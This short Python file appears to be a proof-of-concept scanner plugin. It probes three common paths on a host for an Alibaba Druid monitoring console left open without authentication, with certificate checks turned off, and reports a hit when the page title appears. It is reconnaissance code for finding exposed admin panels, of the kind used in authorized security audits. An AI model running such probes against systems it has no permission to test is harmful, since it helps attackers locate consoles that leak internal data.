import requests

def poc(host, port, timeout):
    druid_path = [f"http://{host}:{port}/druid/index.html", f"http://{host}:{port}/system/index.html",
                  f"http://{host}:{port}/webpage/system/druid/index.html"]
    for path in druid_path:
        try:
            r = requests.get(path, timeout=timeout, allow_redirects=False, verify=False)
            if "Druid Stat Index" in r.text:
                return "Druid is unauthorized"
        except:
            # traceback.print_exc()
            pass
    return None